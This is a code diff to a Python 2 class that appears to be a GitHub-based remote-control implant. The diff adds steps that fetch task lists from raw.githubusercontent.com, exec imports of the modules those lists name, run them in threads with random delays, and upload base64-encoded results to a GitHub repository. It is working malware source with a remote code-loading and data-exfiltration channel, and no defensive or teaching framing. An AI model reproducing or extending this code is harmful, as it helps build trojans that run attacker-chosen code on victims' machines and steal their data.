@@ -18,15 +18,13 @@ class Boy(object):
     _id = 'abc'
     config_url = ('https://raw.githubusercontent.com/how2how/toy/master/toy/'
                   'config/')
-    moudles_url = (
-        'https://raw.githubusercontent.com/how2how/toy/master/toy/modules')
 
     def __init__(self, config):
         guser = config.pop('gu', '')
         gpass = config.pop('gp', '')
         grepo = config.pop('gr', '')
         self.base_modules = config.pop('bm', {})
-        self.task_url = config.pop('tu', self.moudles_url)
+        self.task_url = config.pop('tu', self.config_url)
         self.run_modules = config.pop('rm', [])
         self.cf = int(config.pop('cf', 60))
         self.task_queue = Queue.Queue()
@@ -45,7 +43,7 @@ class Boy(object):
         remote_path = 'data/%s/%d.data' % (
             self._id, random.randint(1000, 100000))
         self.repo.create_file(remote_path, msg, base64.b64encode(data))
-    return
+        return
 
     def load(module, url):
         add_remote_repo([module], url)
@@ -59,14 +57,23 @@ class Boy(object):
     def install(self):
         for pkg, url in self.base_modules.items():
             add_remote_repo([pkg], url)
+        for m in self.run_modules:
+            try:
+                exec "from toy.modules import %s" % m
+            except Exception:
+                pass
 
     @staticmethod
-    def get_config(self, config_url):
+    def get_config(self, config_url, auto_load=False):
         try:
             config = urlopen(config_url).read()
-            return json.loads(config)
+            config = json.loads(config)
+            if auto_load:
+                for m in config:
+                    exec "from toy.modules import %s" % m['module']
         except Exception:
-            return None
+            config = {}
+        return config
 
     @staticmethod
     def enc(data):
@@ -77,6 +84,7 @@ class Boy(object):
         pass
 
     def run(self):
+        self.install()
         def worker(m):
             self.task_queue.put(1)
             result = sys.modules[m].run()
@@ -85,12 +93,13 @@ class Boy(object):
             return
         while True:
             if self.task_queue.empty():
-                # tasks = self.get_config(self.task_url + self._id + '.json')
-                for rm in self.run_modules:
+                tasks = self.get_config(
+                    self.task_url + self._id + '.json', True)
+                for task in tasks:
                     try:
-                        exec "from toy.modules import %s" % rm
+                        # exec "from toy.modules import %s" % rm
                         t = threading.Thread(
-                            target=worker, args=(rm,))
+                            target=worker, args=(task['module'],))
                         t.start()
                         time.sleep(random.randint(1, 10))
                     except Exception:
